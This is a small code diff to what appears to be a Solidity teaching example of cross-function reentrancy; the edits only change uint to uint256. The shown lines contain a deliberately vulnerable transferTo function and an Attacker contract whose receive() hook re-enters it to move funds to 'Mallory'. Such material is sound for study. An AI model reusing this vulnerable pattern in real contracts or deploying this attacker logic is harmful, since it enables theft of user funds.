@@ -34,7 +34,7 @@ contract xFnReentrancy is ReentrancyGuard {
 
     // Function not expected to follow CEI or use nonReentrat as it doesn't have external interactions...
     // Safe right??? :D
-    function transferTo(address recipient, uint amount) external { //nonReentrant could mitigate the exploit
+    function transferTo(address recipient, uint256 amount) external { //nonReentrant could mitigate the exploit
         require(balance[msg.sender] >= amount, "Not enough funds to transfer!");
         balance[msg.sender] -= amount;
         balance[recipient] += amount;     
@@ -71,7 +71,7 @@ contract Attacker {
 
 
     receive() external payable {
-        uint amount = target.userBalance(address(this));
+        uint256 amount = target.userBalance(address(this));
         console.log("Malicious contract received %s but their deposit is still %s!", msg.value, amount);
         target.transferTo(wallet, amount);
         console.log("Deposit transfered internally to Mallory");        
